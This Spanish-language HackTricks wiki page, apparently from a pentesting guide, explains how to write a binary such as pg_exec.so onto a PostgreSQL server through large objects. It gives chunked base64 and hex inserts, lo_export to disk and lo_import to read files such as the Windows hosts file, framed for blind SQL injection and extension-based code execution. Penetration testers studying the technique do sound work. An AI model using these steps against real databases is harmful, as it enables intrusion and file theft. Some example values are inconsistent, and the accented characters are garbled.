<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs exclusivos**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>


# Objetos Grandes en PostgreSQL

PostgreSQL expone una estructura llamada **objeto grande** (tabla `pg_largeobject`), que se utiliza para almacenar datos que ser√≠an dif√≠ciles de manejar en su totalidad (como una imagen o un documento PDF). A diferencia de la funci√≥n `COPY TO`, la ventaja de los **objetos grandes** radica en el hecho de que los **datos** que **contienen** pueden ser **exportados de nuevo** al **sistema de archivos** como una **copia id√©ntica del archivo original importado**.

Para **guardar un archivo completo dentro de esta tabla**, primero necesitas **crear un objeto** dentro de la tabla mencionada (identificado por un **LOID**) y luego **insertar fragmentos de 2KB** dentro de este objeto. Es muy importante que todos los **fragmentos tengan 2KB** (excepto posiblemente el √∫ltimo) **o** la funci√≥n de **exportaci√≥n** al sistema de archivos **no funcionar√°**.

Para **dividir** tu **binario** en **fragmentos** de tama√±o **2KB** puedes hacer:
```bash
split -b 2048 pg_exec.so #This will create files of size 2KB
```
Para codificar cada uno de los archivos creados a Base64 o Hex puedes usar:
```bash
base64 -w 0 <Chunk_file> #Encoded in 1 line
xxd -ps -c 99999999999 <Chunk_file> #Encoded in 1 line
```
{% hint style="info" %}
Al explotar esto, recuerda que debes enviar **fragmentos de 2KB de bytes en texto claro** (no 2KB de bytes codificados en base64 o hex). Si intentas automatizar esto, el tama√±o de un archivo **codificado en hex** es el **doble** (entonces necesitas enviar 4KB de datos codificados para cada fragmento) y el tama√±o de un archivo codificado en **base64** es `ceil(n / 3) * 4`
{% endhint %}

Tambi√©n, al depurar el proceso puedes ver el contenido de los objetos grandes creados con:
```sql
select loid, pageno, encode(data, 'escape') from pg_largeobject;
```
# Uso de lo\_creat & Base64

Primero, necesitamos crear un LOID donde se guardar√° el dato binario:
```sql
SELECT lo_creat(-1);       -- returns OID of new, empty large object
SELECT lo_create(173454);   -- attempts to create large object with OID 43213
```
Si est√°s explotando una **Blind SQLinjection**, te interesar√° m√°s usar `lo_create` con un **LOID fijo** para que **sepas d√≥nde** tienes que **subir** el **contenido**.\
Tambi√©n, ten en cuenta que no hay error de sintaxis, las funciones son `lo_creat` y `lo_create`.

LOID se utiliza para identificar el objeto en la tabla `pg_largeobject`. La inserci√≥n de fragmentos de tama√±o 2KB en la tabla `pg_largeobject` se puede lograr utilizando:
```sql
INSERT INTO pg_largeobject (loid, pageno, data) values (173454, 0, decode('<B64 chunk1>', 'base64'));
INSERT INTO pg_largeobject (loid, pageno, data) values (173454, 1, decode('<B64 chunk2>', 'base64'));
INSERT INTO pg_largeobject (loid, pageno, data) values (173454, 3, decode('<B64 chunk2>', 'base64'));
```
Finalmente, puedes exportar el archivo al sistema de archivos ejecutando (durante este ejemplo se utiliz√≥ el LOID `173454`):
```sql
SELECT lo_export(173454, '/tmp/pg_exec.so');
```
{% hint style="info" %}
Tenga en cuenta que en las versiones m√°s recientes de postgres puede que necesite **subir las extensiones sin indicar ning√∫n camino** en absoluto. [**Lea esto para m√°s informaci√≥n**.](rce-with-postgresql-extensions.md#rce-in-newest-prostgres-versions)
{% endhint %}

Posiblemente est√© interesado en eliminar el objeto grande creado despu√©s de exportarlo:
```sql
SELECT lo_unlink(173454);  -- deletes large object with OID 173454
```
# Uso de lo\_import & Hex

En este escenario se utilizar√° lo\_import para crear un objeto de gran tama√±o. Afortunadamente, en este caso puedes (y no puedes) especificar el LOID que querr√≠as usar:
```sql
select lo_import('C:\\Windows\\System32\\drivers\\etc\\hosts');
select lo_import('C:\\Windows\\System32\\drivers\\etc\\hosts', 173454);
```
Despu√©s de crear el objeto, puedes comenzar a insertar los datos en cada p√°gina (recuerda, debes insertar fragmentos de 2KB):
```sql
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=0;
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=1;
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=2;
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=3;
```
El HEX debe ser solo el hex (sin `0x` o `\x`), ejemplo:
```sql
update pg_largeobject set data=decode('68656c6c6f', 'hex') where loid=173454 and pageno=0;
```
Finalmente, exporte los datos a un archivo y elimine el objeto grande:
```sql
select lo_export(173454, 'C:\\path\to\pg_extension.dll');
select lo_unlink(173454);  -- deletes large object with OID 173454
```
{% hint style="info" %}
Tenga en cuenta que en las versiones m√°s recientes de postgres puede ser necesario **subir las extensiones sin indicar ning√∫n camino** en absoluto. [**Lea esto para m√°s informaci√≥n**.](rce-with-postgresql-extensions.md#rce-in-newest-prostgres-versions)
{% endhint %}

# Limitaciones

Despu√©s de leer la documentaci√≥n de objetos grandes en PostgreSQL, podemos descubrir que **los objetos grandes pueden tener ACL** (Lista de Control de Acceso). Es posible configurar **nuevos objetos grandes** para que su usuario **no tenga suficientes privilegios** para leerlos, incluso si fueron creados por su usuario.

Sin embargo, puede haber **objetos antiguos con una ACL que permite al usuario actual leerlo**, entonces podemos exfiltrar el contenido de ese objeto.


<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si desea ver su **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulte los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obtenga el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önase al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠game** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparta sus trucos de hacking enviando PRs a los repositorios de github** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
